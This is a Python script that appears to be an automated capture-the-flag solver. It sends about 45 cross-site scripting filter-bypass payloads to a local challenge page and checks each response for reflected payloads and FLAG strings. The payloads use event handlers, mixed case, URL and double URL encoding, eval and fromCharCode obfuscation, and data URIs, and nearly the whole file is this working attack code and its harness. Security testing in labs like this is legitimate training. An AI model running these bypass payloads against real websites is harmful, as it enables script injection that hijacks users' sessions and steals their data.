import requests
import urllib.parse
import re

# Target URL
base_url = "http://127.0.0.1:33203/page"

# XSS payload variations to test - focus on alert('XSS') requirement
payloads_to_test = [
    # 1. Plain SVG onload with alert('XSS')
    ("Plain SVG", "<svg onload=alert('XSS')>", "plain_svg"),
    
    # 2. HTML entity encoding for quotes: <svg onload=alert(&#39;XSS&#39;)>
    ("HTML entity encoding", "<svg onload=alert(&#39;XSS&#39;)>", "html_entity"),
    
    # 3. URL encoding for entire payload
    ("URL encoded", "%3Csvg%20onload%3Dalert(%27XSS%27)%3E", "url_encoded"),
    
    # 4. Double URL encoding
    ("Double URL encoded", "%253Csvg%2520onload%253Dalert%2528%2527XSS%2527%2529%253E", "double_url"),
    
    # 5. Mixed case tags
    ("Mixed case tags", "<SVG ONLOAD=alert('XSS')>", "mixed_case"),
    
    # 6. Mixed case with URL encoding
    ("Mixed case URL", "%3CSvG%20oNlOaD%3Dalert(%27XSS%27)%3E", "mixed_case_url"),
    
    # 7. Nested tags
    ("Nested SVG", "<svg><svg onload=alert('XSS')>", "nested"),
    
    # 8. Different syntax - slash without space  
    ("Slash syntax", "<svg/onload=alert('XSS')>", "slash_syntax"),
    
    # 9. Slash syntax URL encoded
    ("Slash URL encoded", "%3Csvg/onload=alert(%27XSS%27)%3E", "slash_url"),
    
    # 10. Whitespace variations
    ("Whitespace before =", "<svg onload = alert('XSS')>", "whitespace_eq"),
    ("Multiple spaces", "<svg onload=     alert('XSS')>", "multi_space"),
    
    # 11. Event handler variations
    ("Onmouseover", "<svg onmouseover=alert('XSS')>", "onmouseover"),
    ("Onmouseenter", "<svg onmouseenter=alert('XSS')>", "onmouseenter"),
    ("Onclick", "<svg onclick=alert('XSS')>", "onclick"),
    ("Onfocus", "<svg onfocus=alert('XSS')>", "onfocus"),
    
    # 12. Event handlers URL encoded
    ("Onmouseover URL", "%3Csvg%20onmouseover%3Dalert(%27XSS%27)%3E", "onmouseover_url"),
    ("Onclick URL", "%3Csvg%20onclick%3Dalert(%27XSS%27)%3E", "onclick_url"),
    
    # 13. Data URI in iframe
    ("Data URI iframe", '<iframe src="data:text/html,<script>alert("XSS")</script>">', "data_uri_iframe"),
    
    # 14. Data URI base64 encoded
    ("Data URI base64", '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">', "data_uri_b64"),
    
    # 15. Using other tags
    ("IMG onerror", "<img src=x onerror=alert('XSS')>", "img_onerror"),
    ("IMG onerror URL", "%3Cimg%20src=x%20onerror=alert(%27XSS%27)%3E", "img_onerror_url"),
    ("BODY onload", "<body onload=alert('XSS')>", "body_onload"),
    ("BODY onload URL", "%3Cbody%20onload%3Dalert(%27XSS%27)%3E", "body_onload_url"),
    ("SCRIPT tag", "<script>alert('XSS')</script>", "script_tag"),
    ("SCRIPT tag URL", "%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E", "script_tag_url"),
    
    # 16. Character encoding variations
    ("Backticks", "<svg onload=alert(`XSS`)>", "backticks"),
    ("Double quotes", '<svg onload=alert("XSS")>', "double_quotes"),
    ("URL encoded quotes", "%3Csvg%20onload%3Dalert(%22XSS%22)%3E", "url_double_quotes"),
    
    # 17. Eval-based obfuscation
    ("Eval", "<svg onload=eval('alert(\\'XSS\\')')>", "eval_obf"),
    ("Eval URL", "%3Csvg%20onload%3Deval(%27alert(%5C%27XSS%5C%27)%27)%3E", "eval_url"),
    
    # 18. String.fromCharCode
    ("CharCode", "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>", "charcode"),
    
    # 19. Comment-based bypass
    ("Comment break", "<svg<!-- --> onload=alert('XSS')>", "comment_break"),
    
    # 20. Using marquee (old but sometimes works)
    ("Marquee", "<marquee onstart=alert('XSS')>XSS</marquee>", "marquee"),
    ("Marquee URL", "%3Cmarquee%20onstart%3Dalert(%27XSS%27)%3EXSS%3C%2Fmarquee%3E", "marquee_url"),
    
    # 21. Details tag
    ("Details", "<details open ontoggle=alert('XSS')>", "details"),
    ("Details URL", "%3Cdetails%20open%20ontoggle%3Dalert(%27XSS%27)%3E", "details_url"),
]

print("=" * 80)
print("[*] XSS Filter Bypass Testing")
print(f"[*] Target: {base_url}?name=[payload]")
print(f"[*] Testing {len(payloads_to_test)} different payload variations")
print("=" * 80)

# Store results for analysis
results = []

for test_name, payload, technique in payloads_to_test:
    print(f"\n[+] Testing: {test_name}")
    print(f"    Payload: {payload[:80]}")
    
    try:
        # Send GET request with payload as 'name' parameter
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        # Check if payload is reflected in response
        payload_reflected = payload in response.text
        
        # Check if decoded payload appears
        decoded_payload = urllib.parse.unquote(payload)
        decoded_reflected = decoded_payload in response.text
        
        # Check for exact alert patterns
        alert_single_quotes = "alert('XSS')" in response.text
        alert_double_quotes = 'alert("XSS")' in response.text
        alert_backticks = "alert(`XSS`)" in response.text
        
        # Check for any FLAG patterns
        flag_patterns = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        # Analyze response behavior
        response_length = len(response.content)
        status_code = response.status_code
        
        # Look for filter indicators in response
        is_filtered = False
        is_error = False
        is_success = False
        
        if 'Let the game begin' in response.text or 'new_star.png' in response.text:
            is_filtered = True
        
        if 'Failed! Try again!' in response.text or 'error_star.png' in response.text:
            is_error = True
            
        if flag_patterns or 'Success' in response.text or 'Congratulations' in response.text:
            is_success = True
        
        # Store results
        result = {
            'technique': technique,
            'test_name': test_name,
            'payload': payload,
            'status_code': status_code,
            'response_length': response_length,
            'payload_reflected': payload_reflected,
            'decoded_reflected': decoded_reflected,
            'alert_single': alert_single_quotes,
            'alert_double': alert_double_quotes,
            'alert_backticks': alert_backticks,
            'is_filtered': is_filtered,
            'is_error': is_error,
            'is_success': is_success,
            'flags': flag_patterns,
            'full_response': response.text
        }
        results.append(result)
        
        # Print analysis
        print(f"    Status: {status_code} | Length: {response_length} bytes")
        print(f"    Payload reflected: {payload_reflected}")
        print(f"    Decoded reflected: {decoded_reflected}")
        
        alert_indicators = []
        if alert_single_quotes: alert_indicators.append("alert('XSS')")
        if alert_double_quotes: alert_indicators.append('alert("XSS")')
        if alert_backticks: alert_indicators.append("alert(`XSS`)")
        
        if alert_indicators:
            print(f"    Alert found: {', '.join(alert_indicators)}")
        
        if flag_patterns:
            print(f"    [!!] FLAG FOUND: {flag_patterns}")
        
        if is_filtered:
            print(f"    [FILTERED] Let the game begin")
        elif is_error:
            print(f"    [ERROR] Failed! Try again!")
        elif is_success:
            print(f"    [SUCCESS] Payload executed!")
        
    except requests.exceptions.Timeout:
        print(f"    [ERROR] Request timed out")
    except Exception as e:
        print(f"    [ERROR] {str(e)}")

# Summary analysis
print("\n" + "=" * 80)
print("[*] SUMMARY ANALYSIS")
print("=" * 80)

filtered_count = sum(1 for r in results if r['is_filtered'])
error_count = sum(1 for r in results if r['is_error'])
success_count = sum(1 for r in results if r['is_success'])
payload_reflected_count = sum(1 for r in results if r['payload_reflected'])
decoded_reflected_count = sum(1 for r in results if r['decoded_reflected'])

print(f"Total payloads tested: {len(results)}")
print(f"Filtered (blocked): {filtered_count}")
print(f"Validation errors (reached but failed): {error_count}")
print(f"Success (executed): {success_count}")
print(f"Raw payload reflected: {payload_reflected_count}")
print(f"Decoded payload reflected: {decoded_reflected_count}")

# Show payloads that bypassed filter but failed validation (most interesting)
print(f"\n[*] Payloads that bypassed filter but failed validation:")
print("-" * 80)
for r in results:
    if r['is_error'] and (r['decoded_reflected'] or r['payload_reflected']):
        print(f"\n[+] {r['test_name']}:")
        print(f"    Decoded reflected: {r['decoded_reflected']}")
        print(f"    Raw reflected: {r['payload_reflected']}")
        print(f"    Payload: {r['payload']}")
        
        # Check which alert patterns appear
        alerts = []
        if r['alert_single']: alerts.append("alert('XSS')")
        if r['alert_double']: alerts.append('alert("XSS")')
        if r['alert_backticks']: alerts.append("alert(`XSS`)")
        
        if alerts:
            print(f"    Alert patterns in response: {', '.join(alerts)}")

# Show any successful payloads
if success_count > 0:
    print(f"\n[*] SUCCESSFUL PAYLOADS:")
    print("-" * 80)
    for r in results:
        if r['is_success']:
            print(f"\n[+] {r['test_name']}:")
            print(f"    Payload: {r['payload']}")
            if r['flags']:
                print(f"    Flags: {r['flags']}")

# Show any flags found
all_flags = [flag for r in results for flag in r['flags']]
if all_flags:
    print(f"\n[*] FLAGS FOUND:")
    print("-" * 80)
    for flag in all_flags:
        print(f"    {flag}")

print("\n[*] Testing complete")
